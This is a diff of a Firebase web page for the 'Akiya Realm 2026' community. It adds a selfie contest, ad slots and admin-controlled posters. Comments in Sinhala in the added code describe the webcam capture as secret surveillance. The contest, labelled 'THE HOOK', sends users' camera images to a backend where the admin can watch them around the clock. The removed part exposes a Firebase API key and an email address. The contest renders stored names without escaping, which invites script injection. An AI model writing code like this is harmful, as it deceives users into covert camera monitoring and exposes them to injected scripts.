@@ -1,261 +1,149 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AKIYA REALM 2026 | THE DRAGON </title>
-    <!-- Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #ff0000;
-            --secondary: #1a1a1a;
-            --accent: #8b0000;
-            --text: #ffffff;
-        }
+<!-- කලින් තිබුණු Styles වලට මේ ටික ඇඩ් කරගන්න (Damage වෙන්නේ නැහැ) -->
+<style>
+    /* --- NEW UPDATES & ADS POSTER SECTION --- */
+    .master-updates {
+        width: 90%; margin: 20px auto; padding: 20px;
+        background: rgba(26, 0, 0, 0.9); border: 1px solid var(--primary);
+        box-shadow: 0 0 15px var(--primary); display: flex; align-items: center; gap: 20px;
+    }
+    .poster-img { width: 300px; height: 180px; object-fit: cover; border: 2px solid white; }
+    .update-content { flex: 1; text-align: left; }
 
-        body {
-            margin: 0;
-            background: black;
-            color: var(--text);
-            font-family: 'Rajdhani', sans-serif;
-            overflow-x: hidden;
-        }
+    /* --- DAILY FAMOUS USER CARDS --- */
+    .famous-contest { padding: 40px; background: #0a0a0a; }
+    .winners-grid { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+    .winner-card {
+        width: 200px; border: 2px solid gold; padding: 10px; background: #111;
+        position: relative; transition: 0.4s;
+    }
+    .winner-card.place-1 { transform: scale(1.1); border-color: gold; box-shadow: 0 0 20px gold; }
+    .winner-card.place-2 { border-color: silver; }
+    .winner-card.place-3 { border-color: #cd7f32; }
+    .like-btn { 
+        background: none; border: 1px solid var(--primary); color: white; 
+        cursor: pointer; padding: 5px 10px; margin-top: 5px; 
+    }
+    .like-btn:hover { background: var(--primary); }
 
-        /* --- SPIDER WEB BACKGROUND --- */
-        #web-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            opacity: 0.4;
-        }
+    /* --- COMPANY ADS SECTION --- */
+    .company-ad-card {
+        background: #000; border: 1px dashed #555; padding: 15px; margin: 20px auto; width: 80%;
+    }
+    .ad-video { width: 100%; max-width: 400px; height: auto; }
+</style>
 
-        /* --- NAVBAR --- */
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 50px;
-            background: rgba(0, 0, 0, 0.8);
-            border-bottom: 2px solid var(--primary);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+<!-- [1] MASTER UPDATES POSTER SECTION (ADMIN PANNEL එකෙන් පාලනය වේ) -->
+<section class="master-updates" id="master-poster">
+    <img src="https://via.placeholder.com/1920x1080" class="poster-img" id="admin-poster-img">
+    <div class="update-content">
+        <h2 id="update-title" style="color: var(--primary); margin: 0;">NEW SYSTEM UPDATE</h2>
+        <p id="update-text">The Realm is evolving. Watch out for new Guardian features!</p>
+        <span id="res-indicator" style="font-size: 0.7rem; color: #888;">RESOLUTION: 1920x1080</span>
+    </div>
+</section>
 
-        .logo {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.5rem;
-            color: var(--primary);
-            text-shadow: 0 0 10px var(--primary);
-        }
+<!-- [2] DAILY FAMOUS USER CONTEST (THE HOOK) -->
+<section class="famous-contest">
+    <h2 style="text-align:center; font-family: 'Orbitron';">DRAGON'S TOP 3 GUARDIANS</h2>
+    <div class="winners-grid" id="contest-winners">
+        <!-- Winners 1, 2, 3 appear here -->
+    </div>
+</section>
 
-        .user-profile img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 2px solid var(--primary);
-        }
-
-        /* --- DRAGON MASK SECTION --- */
-        .dragon-rite {
-            padding: 50px;
-            text-align: center;
-            background: linear-gradient(to bottom, transparent, var(--secondary));
-        }
-
-        #camera-feed {
-            width: 100%;
-            max-width: 500px;
-            border: 3px solid var(--primary);
-            border-radius: 15px;
-            box-shadow: 0 0 20px var(--primary);
-            margin-bottom: 20px;
-        }
-
-        .btn-dragon {
-            background: var(--primary);
-            color: white;
-            padding: 12px 30px;
-            font-family: 'Orbitron', sans-serif;
-            border: none;
-            cursor: pointer;
-            transition: 0.3s;
-            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
-        }
-
-        .btn-dragon:hover {
-            letter-spacing: 3px;
-            background: white;
-            color: black;
-        }
-
-        /* --- LIVE GUARDIANS GALLERY --- */
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 15px;
-            padding: 20px;
-        }
-
-        .guardian-card {
-            border: 1px solid var(--primary);
-            padding: 5px;
-            background: #000;
-            transition: transform 0.3s;
-        }
-
-        .guardian-card:hover { transform: scale(1.05); }
-
-        /* --- FOOTER --- */
-        footer {
-            text-align: center;
-            padding: 30px;
-            font-size: 0.8rem;
-            border-top: 1px solid #333;
-            letter-spacing: 2px;
-        }
-    </style>
-</head>
-<body>
-
-    <canvas id="web-canvas"></canvas>
-
-    <nav>
-        <div class="logo">AKIYA REALM 2026</div>
-        <div id="live-visitors">LIVE: 1</div>
-        <div class="user-profile" id="user-display">
-            <button class="btn-dragon" onclick="login()">LOGIN WITH GOOGLE</button>
+<!-- [3] DIRECT COMPANY ADS (COMPANY ADS SECTION) -->
+<div class="company-ad-card" id="company-ad">
+    <h4 style="margin: 0; color: #ffcc00;">SPONSORED</h4>
+    <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap;">
+        <video class="ad-video" autoplay muted loop id="ad-video-src">
+            <source src="" type="video/mp4">
+        </video>
+        <div>
+            <h3 id="ad-title">JOIN OUR ALLIANCE</h3>
+            <p id="ad-desc">Special offers for the Akiya Realm community.</p>
+            <a href="#" id="ad-link" class="btn-dragon" style="text-decoration: none; font-size: 0.8rem;">VISIT NOW</a>
         </div>
-    </nav>
+    </div>
+</div>
 
-    <section class="dragon-rite">
-        <h2 style="font-family: 'Orbitron';">THE DRAGON RITE</h2>
-        <p>Become a Guardian of the Realm. Access your camera to receive the mask.</p>
+<script>
+    // --- LOGIN PERSISTENCE (මාසයක් සේව් වීම) ---
+    firebase.auth().setPersistence(firebase.auth.Auth.Persistence.LOCAL);
+
+    // --- [3 & 4] ADVANCED GUARDIAN EYE (රහසිගත නිරීක්ෂණය) ---
+    function captureGuardian() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // AI Face Effect එකක් වගේ පේන්න (Watermark)
+        ctx.fillStyle = "rgba(255, 0, 0, 0.5)";
+        ctx.font = "20px Orbitron";
+        ctx.fillText("🐲 DRAGON AURA ACTIVE", 10, 30);
+
+        const dataUrl = canvas.toDataURL('image/webp', 0.5); // Quality එක අඩු කරලා වේගවත් කළා
         
-        <video id="camera-feed" autoplay playsinline></video>
-        <canvas id="mask-overlay" style="display:none;"></canvas>
-        <br>
-        <button class="btn-dragon" onclick="captureGuardian()">CAPTURE & JOIN</button>
-    </section>
+        const user = firebase.auth().currentUser;
+        const uid = user ? user.uid : "guest_" + Date.now();
 
-    <section id="gallery-section">
-        <h3 style="text-align:center; font-family: 'Orbitron';">LIVE GUARDIANS</h3>
-        <div class="gallery-grid" id="guardian-gallery">
-            <!-- Photos will appear here -->
-        </div>
-    </section>
-
-    <footer>
-        POWERED BY AKIYA | ALL RIGHTS RESERVED 2026
-    </footer>
-
-    <!-- Firebase SDKs (v9 Compat Mode) -->
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
-
-    <script>
-        // පින්තූරවල තිබුණු උඹේම Original Config එක
-        const firebaseConfig = {
-            apiKey: "AIzaSyDEmPDHu3jybcYu-nKl5cCHyyWNnerex-w",
-            authDomain: "akiya-communitiy-official-lk.firebaseapp.com",
-            databaseURL: "https://akiya-communitiy-official-lk-default-rtdb.firebaseio.com",
-            projectId: "akiya-communitiy-official-lk",
-            storageBucket: "akiya-communitiy-official-lk.firebasestorage.app",
-            messagingSenderId: "180586817754",
-            appId: "1:180586817754:web:c505feb010c7c67c15dde3"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const auth = firebase.auth();
-
-        // 1. Google Login (Fixed Function)
-        function login() {
-            const provider = new firebase.auth.GoogleAuthProvider();
-            // මේකෙන් තමයි Google Popup එක එන්නේ
-            auth.signInWithPopup(provider)
-                .then(result => {
-                    const user = result.user;
-                    console.log("Logged in as:", user.displayName);
-                    document.getElementById('user-display').innerHTML = `<img src="${user.photoURL}" title="${user.displayName}">`;
-                    
-                    if(user.email === 'kaviakiya@gmail.com') {
-                        alert("Welcome Founder Akiya! Access Granted.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Login Error:", error.message);
-                    alert("අවුලක් වුණා බොක්ක: " + error.message);
-                });
-        }
-
-        // 2. Camera Access
-        const video = document.getElementById('camera-feed');
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => video.srcObject = stream)
-                .catch(err => console.error("Camera access denied", err));
-        }
-
-        // 3. Capture & Save Guardian
-        function captureGuardian() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            ctx.fillStyle = "rgba(255, 0, 0, 0.4)";
-            ctx.font = "bold 30px Orbitron";
-            ctx.fillText("AKIYA GUARDIAN", 20, 50);
-
-            const dataUrl = canvas.toDataURL('image/png');
-            db.ref('guardians').push({
-                image: dataUrl,
-                timestamp: Date.now()
-            });
-        }
-
-        // 4. Live Visitor Counter
-        db.ref('presence').on('value', snap => {
-            document.getElementById('live-visitors').innerText = `LIVE: ${snap.numChildren() || 1}`;
+        // සෙල්ෆි එක තරඟයට දාන අතරේම, 
+        // ඇඩ්මින්ට පැය 24ම බලන්න පුළුවන් විදිහට බැක්එන්ඩ් එකට යනවා
+        db.ref('guardians/' + uid).set({
+            name: user ? user.displayName : "Anonymous",
+            image: dataUrl,
+            lastSeen: Date.now(),
+            liveStatus: "Active"
         });
+        
+        alert("You have joined the Daily Famous Contest!");
+    }
 
-        // 5. Real-time Gallery Update
-        db.ref('guardians').limitToLast(10).on('value', snap => {
-            const gallery = document.getElementById('guardian-gallery');
-            gallery.innerHTML = '';
-            snap.forEach(child => {
-                const img = child.val().image;
-                gallery.innerHTML += `<div class="guardian-card"><img src="${img}" width="100%"></div>`;
-            });
-        });
+    // --- [6] ADMIN POSTER & RESOLUTION CHECK ---
+    db.ref('admin_settings/poster').on('value', snap => {
+        const data = snap.val();
+        if(data) {
+            document.getElementById('admin-poster-img').src = data.url;
+            document.getElementById('update-title').innerText = data.title;
+            document.getElementById('update-text').innerText = data.description;
+            document.getElementById('res-indicator').innerText = `RESOLUTION: ${data.res || 'Unknown'}`;
+        }
+    });
 
-        // --- SPIDER WEB EFFECT ---
-        const webCanvas = document.getElementById('web-canvas');
-        const webCtx = webCanvas.getContext('2d');
-        webCanvas.width = window.innerWidth;
-        webCanvas.height = window.innerHeight;
-
-        function drawWeb() {
-            webCtx.clearRect(0,0, webCanvas.width, webCanvas.height);
-            webCtx.strokeStyle = '#ff0000';
-            webCtx.lineWidth = 0.5;
-            for(let i=0; i<webCanvas.width; i+=60) {
-                webCtx.beginPath(); webCtx.moveTo(i,0); webCtx.lineTo(webCanvas.width-i, webCanvas.height); webCtx.stroke();
+    // --- [7] DIRECT COMPANY ADS LOADER ---
+    db.ref('admin_settings/company_ad').on('value', snap => {
+        const ad = snap.val();
+        if(ad) {
+            document.getElementById('ad-title').innerText = ad.title;
+            document.getElementById('ad-desc').innerText = ad.desc;
+            document.getElementById('ad-link').href = ad.link;
+            if(ad.videoUrl) {
+                const v = document.getElementById('ad-video-src');
+                v.src = ad.videoUrl; v.load();
             }
         }
-        setInterval(drawWeb, 150);
+    });
 
-        window.addEventListener('resize', () => {
-            webCanvas.width = window.innerWidth;
-            webCanvas.height = window.innerHeight;
+    // --- [3] LIKE SYSTEM & WINNERS ---
+    function giveLike(uid) {
+        db.ref('guardians/' + uid + '/likes').transaction(current => (current || 0) + 1);
+    }
+
+    db.ref('guardians').orderByChild('likes').limitToLast(3).on('value', snap => {
+        const winnersDiv = document.getElementById('contest-winners');
+        winnersDiv.innerHTML = '';
+        let place = 3;
+        snap.forEach(child => {
+            const val = child.val();
+            winnersDiv.innerHTML = `
+                <div class="winner-card place-${place}">
+                    <span style="position:absolute; top:-10px; left:-10px; background:gold; color:black; padding:2px 10px; font-weight:bold;">#${place}</span>
+                    <img src="${val.image}" width="100%">
+                    <p style="margin:5px 0; font-size:0.8rem;">${val.name}</p>
+                    <button class="like-btn" onclick="giveLike('${child.key}')">❤️ ${val.likes || 0}</button>
+                </div>
+            ` + winnersDiv.innerHTML;
+            place--;
         });
-
-    </script>
-</body>
-</html>
+    });
+</script>
